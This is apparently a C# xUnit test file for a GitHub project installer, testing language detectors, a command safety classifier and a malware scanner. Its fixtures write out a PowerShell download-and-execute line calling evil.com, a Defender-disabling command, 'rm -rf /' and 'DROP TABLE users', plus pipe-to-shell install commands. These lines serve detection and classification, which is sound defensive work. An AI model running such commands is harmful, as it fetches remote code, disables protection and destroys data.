using UniversalGitHubInstaller.Core.Detection;
using UniversalGitHubInstaller.Core.Models;
using UniversalGitHubInstaller.Core.Security;
using UniversalGitHubInstaller.Core.Services;
using Xunit;

namespace UniversalGitHubInstaller.Tests;

public class PythonDetectorTests
{
    [Fact]
    public async Task DetectsRequirementsTxt()
    {
        var dir = CreateTempDir();
        File.WriteAllText(Path.Combine(dir, "requirements.txt"), "flask==2.3.0\nrequests\n");
        File.WriteAllText(Path.Combine(dir, "app.py"), "from flask import Flask");

        var detector = new PythonDetector();
        var result = await detector.DetectAsync(dir);

        Assert.True(result.Detected);
        Assert.Equal("Python", result.Technology!.Name);
        Assert.Equal("pip", result.PackageManager!.Name);
        Assert.Contains("pip install -r requirements.txt", result.PackageManager.InstallCommand);
        Assert.Equal(2, result.PackageManager.DependencyCount);
        Assert.Contains(result.RunCommands, c => c.Contains("app.py"));
        Cleanup(dir);
    }

    [Fact]
    public async Task DetectsPoetry()
    {
        var dir = CreateTempDir();
        File.WriteAllText(Path.Combine(dir, "pyproject.toml"), "[tool.poetry]\nname=\"test\"");
        File.WriteAllText(Path.Combine(dir, "poetry.lock"), "");

        var detector = new PythonDetector();
        var result = await detector.DetectAsync(dir);

        Assert.True(result.Detected);
        Assert.Equal("Poetry", result.PackageManager!.Name);
        Assert.Equal("poetry install", result.PackageManager.InstallCommand);
        Cleanup(dir);
    }

    [Fact]
    public async Task DetectsUv()
    {
        var dir = CreateTempDir();
        File.WriteAllText(Path.Combine(dir, "pyproject.toml"), "[tool.uv]\ndev-dependencies=[]");
        File.WriteAllText(Path.Combine(dir, "uv.lock"), "");

        var detector = new PythonDetector();
        var result = await detector.DetectAsync(dir);

        Assert.True(result.Detected);
        Assert.Equal("uv", result.PackageManager!.Name);
        Cleanup(dir);
    }

    [Fact]
    public async Task DoesNotDetectEmpty()
    {
        var dir = CreateTempDir();
        var detector = new PythonDetector();
        var result = await detector.DetectAsync(dir);
        Assert.False(result.Detected);
        Cleanup(dir);
    }

    private string CreateTempDir()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"ugpi_test_{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        return dir;
    }
    private void Cleanup(string dir) { try { Directory.Delete(dir, true); } catch { } }
}

public class NodeDetectorTests
{
    [Fact]
    public async Task DetectsNpmProject()
    {
        var dir = CreateTempDir();
        File.WriteAllText(Path.Combine(dir, "package.json"), """
        {
          "name": "test",
          "scripts": { "start": "node index.js", "build": "tsc", "test": "jest" },
          "dependencies": { "express": "^4.18.0" },
          "devDependencies": { "typescript": "^5.0.0" }
        }
        """);
        File.WriteAllText(Path.Combine(dir, "package-lock.json"), "{}");

        var detector = new NodeDetector();
        var result = await detector.DetectAsync(dir);

        Assert.True(result.Detected);
        Assert.Equal("npm", result.PackageManager!.Name);
        Assert.Equal("npm ci", result.PackageManager.InstallCommand);
        Assert.Equal(2, result.PackageManager.DependencyCount);
        Assert.Contains(result.RunCommands, c => c.Contains("start"));
        Assert.Equal("npm run build", result.BuildCommand);
        Assert.Equal("npm test", result.TestCommand);
        Cleanup(dir);
    }

    [Fact]
    public async Task DetectsPnpm()
    {
        var dir = CreateTempDir();
        File.WriteAllText(Path.Combine(dir, "package.json"), """{"name": "test"}""");
        File.WriteAllText(Path.Combine(dir, "pnpm-lock.yaml"), "");

        var detector = new NodeDetector();
        var result = await detector.DetectAsync(dir);

        Assert.True(result.Detected);
        Assert.Equal("pnpm", result.PackageManager!.Name);
        Cleanup(dir);
    }

    private string CreateTempDir()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"ugpi_test_{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        return dir;
    }
    private void Cleanup(string dir) { try { Directory.Delete(dir, true); } catch { } }
}

public class DotNetDetectorTests
{
    [Fact]
    public async Task DetectsCsproj()
    {
        var dir = CreateTempDir();
        File.WriteAllText(Path.Combine(dir, "MyApp.csproj"), "<Project Sdk=\"Microsoft.NET.Sdk\">");

        var detector = new DotNetDetector();
        var result = await detector.DetectAsync(dir);

        Assert.True(result.Detected);
        Assert.Equal(".NET", result.Technology!.Name);
        Assert.Equal("dotnet build", result.BuildCommand);
        Cleanup(dir);
    }

    private string CreateTempDir()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"ugpi_test_{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        return dir;
    }
    private void Cleanup(string dir) { try { Directory.Delete(dir, true); } catch { } }
}

public class DockerDetectorTests
{
    [Fact]
    public async Task DetectsDockerCompose()
    {
        var dir = CreateTempDir();
        File.WriteAllText(Path.Combine(dir, "Dockerfile"), "FROM node:20");
        File.WriteAllText(Path.Combine(dir, "docker-compose.yml"), @"
version: '3'
services:
  web:
    build: .
    ports:
      - ""3000:3000""
  db:
    image: postgres
    ports:
      - ""5432:5432""
");
        var detector = new DockerDetector();
        var result = await detector.DetectAsync(dir);

        Assert.True(result.Detected);
        Assert.Equal("Docker", result.Technology!.Name);
        Assert.True(result.Services.Count >= 1);
        Cleanup(dir);
    }

    private string CreateTempDir()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"ugpi_test_{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        return dir;
    }
    private void Cleanup(string dir) { try { Directory.Delete(dir, true); } catch { } }
}

public class RustDetectorTests
{
    [Fact]
    public async Task DetectsCargo()
    {
        var dir = CreateTempDir();
        File.WriteAllText(Path.Combine(dir, "Cargo.toml"), "[package]\nname=\"test\"");
        File.WriteAllText(Path.Combine(dir, "Cargo.lock"), "");

        var detector = new RustDetector();
        var result = await detector.DetectAsync(dir);

        Assert.True(result.Detected);
        Assert.Equal("Rust", result.Technology!.Name);
        Assert.Equal("cargo build --release", result.BuildCommand);
        Cleanup(dir);
    }

    private string CreateTempDir()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"ugpi_test_{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        return dir;
    }
    private void Cleanup(string dir) { try { Directory.Delete(dir, true); } catch { } }
}

public class GoDetectorTests
{
    [Fact]
    public async Task DetectsGoMod()
    {
        var dir = CreateTempDir();
        File.WriteAllText(Path.Combine(dir, "go.mod"), "module example.com/test");
        File.WriteAllText(Path.Combine(dir, "go.sum"), "");

        var detector = new GoDetector();
        var result = await detector.DetectAsync(dir);

        Assert.True(result.Detected);
        Assert.Equal("Go", result.Technology!.Name);
        Cleanup(dir);
    }

    private string CreateTempDir()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"ugpi_test_{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        return dir;
    }
    private void Cleanup(string dir) { try { Directory.Delete(dir, true); } catch { } }
}

public class EnvironmentDetectorTests
{
    [Fact]
    public async Task DetectsEnvExample()
    {
        var dir = CreateTempDir();
        File.WriteAllText(Path.Combine(dir, ".env.example"), @"
DATABASE_URL=postgresql://localhost/db
SECRET_KEY=
API_KEY=CHANGE_ME
PORT=3000
");
        var detector = new EnvironmentDetector();
        var result = await detector.DetectAsync(dir);

        Assert.True(result.Detected);
        Assert.True(result.EnvironmentVariables.Count >= 3);
        Assert.Contains(result.EnvironmentVariables, v => v.Key == "SECRET_KEY" && v.IsRequired && v.IsSecret);
        Assert.Contains(result.EnvironmentVariables, v => v.Key == "API_KEY" && v.IsRequired && v.IsSecret);
        Assert.Contains(result.EnvironmentVariables, v => v.Key == "PORT" && !v.IsRequired);
        Cleanup(dir);
    }

    private string CreateTempDir()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"ugpi_test_{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        return dir;
    }
    private void Cleanup(string dir) { try { Directory.Delete(dir, true); } catch { } }
}

public class CommandClassifierTests
{
    [Theory]
    [InlineData("git status", CommandSafety.Safe)]
    [InlineData("python --version", CommandSafety.Safe)]
    [InlineData("npm test", CommandSafety.Safe)]
    [InlineData("cargo build", CommandSafety.Safe)]
    [InlineData("pip install flask", CommandSafety.RequiresConfirmation)]
    [InlineData("npm install", CommandSafety.RequiresConfirmation)]
    [InlineData("docker compose up", CommandSafety.RequiresConfirmation)]
    [InlineData("rm -rf /", CommandSafety.Dangerous)]
    [InlineData("Invoke-Expression(evil)", CommandSafety.Dangerous)]
    [InlineData("DROP TABLE users", CommandSafety.Dangerous)]
    public void ClassifiesCommands(string command, CommandSafety expected)
    {
        var classifier = new CommandClassifier();
        var result = classifier.Classify(command, ".");
        Assert.Equal(expected, result.Safety);
    }
}

public class GitServiceTests
{
    [Theory]
    [InlineData("https://github.com/user/project", true)]
    [InlineData("https://github.com/user/project.git", true)]
    [InlineData("git@github.com:user/project.git", true)]
    [InlineData("https://example.com/something", false)]
    public void DetectsGitHubUrls(string url, bool expected)
    {
        var svc = new GitService();
        Assert.Equal(expected, svc.IsGitHubUrl(url));
    }

    [Theory]
    [InlineData("https://github.com/user/project", "project")]
    [InlineData("https://github.com/user/project.git", "project")]
    [InlineData("git@github.com:user/my-repo.git", "my-repo")]
    public void ExtractsRepoName(string url, string expected)
    {
        var svc = new GitService();
        Assert.Equal(expected, svc.ExtractRepoName(url));
    }
}

public class ZipServiceTests
{
    [Fact]
    public void FindsRepositoryRoot()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"ugpi_zip_{Guid.NewGuid():N}");
        var nested = Path.Combine(dir, "project-main");
        Directory.CreateDirectory(nested);
        File.WriteAllText(Path.Combine(nested, "package.json"), "{}");

        var svc = new ZipService();
        var root = svc.FindRepositoryRoot(dir);
        Assert.Equal(nested, root);

        try { Directory.Delete(dir, true); } catch { }
    }
}

public class SecurityScannerTests
{
    [Fact]
    public void DetectsMaliciousPatterns()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"ugpi_sec_{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        File.WriteAllText(Path.Combine(dir, "evil.ps1"), @"
            IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')
            Set-MpPreference -DisableRealtimeMonitoring $true
        ");

        var scanner = new SecurityScanner();
        var result = scanner.Scan(dir);

        Assert.False(result.Passed);
        Assert.True(result.CriticalCount > 0);

        try { Directory.Delete(dir, true); } catch { }
    }
}

public class ProjectProfileServiceTests
{
    [Fact]
    public void SavesAndLoadsProfile()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"ugpi_profile_{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);

        var info = new ProjectInfo
        {
            Name = "test-project",
            Path = dir,
            Technologies = new() { new DetectedTechnology { Name = "Python", Framework = "Flask", Category = TechCategory.Language } },
            PackageManagers = new() { new DetectedPackageManager { Name = "pip", InstallCommand = "pip install -r requirements.txt" } },
            BuildSystem = "python setup.py build",
            PossibleRunCommands = new() { "flask run" }
        };

        var svc = new ProjectProfileService();
        var profile = svc.CreateProfile(info);
        svc.SaveProfile(profile, dir);

        var loaded = svc.LoadProfile(dir);
        Assert.NotNull(loaded);
        Assert.Equal("test-project", loaded!.ProjectName);
        Assert.Contains("Python (Flask)", loaded.DetectedStack);
        Assert.Equal("flask run", loaded.RunCommand);

        try { Directory.Delete(dir, true); } catch { }
    }
}

public class SmartCommandProcessorTests
{
    [Theory]
    [InlineData("https://github.com/torvalds/linux", CommandInputKind.GitRepositoryUrl, "https://github.com/torvalds/linux.git", "linux")]
    [InlineData("facebook/react", CommandInputKind.GitHubShortHand, "https://github.com/facebook/react.git", "react")]
    [InlineData("git clone https://github.com/user/my-project.git", CommandInputKind.GitCloneCommand, "https://github.com/user/my-project.git", "my-project")]
    [InlineData("gh repo clone microsoft/vscode", CommandInputKind.GitCloneCommand, "https://github.com/microsoft/vscode.git", "vscode")]
    [InlineData("irm https://raw.githubusercontent.com/user/repo/main/install.ps1 | iex", CommandInputKind.PowerShellInstallCommand, null, null)]
    [InlineData("curl -fsSL https://raw.githubusercontent.com/user/repo/main/install.sh | bash", CommandInputKind.AppleTerminalInstallCommand, null, null)]
    [InlineData("pip install git+https://github.com/psf/requests.git", CommandInputKind.PackageManagerInstall, null, null)]
    public void ParsesCommandsCorrectly(string input, CommandInputKind expectedKind, string? expectedUrl, string? expectedRepo)
    {
        var processor = new SmartCommandProcessor();
        var result = processor.ParseInput(input);
        Assert.Equal(expectedKind, result.Kind);
        if (expectedUrl != null)
        {
            Assert.Equal(expectedUrl, result.ExtractedGitUrl);
        }
        if (expectedRepo != null)
        {
            Assert.Equal(expectedRepo, result.ExtractedRepoName);
        }
    }

    [Fact]
    public void TerminalServiceFindsPowerShell()
    {
        var psExe = TerminalService.FindPowerShellExe();
        Assert.False(string.IsNullOrWhiteSpace(psExe));
    }
}
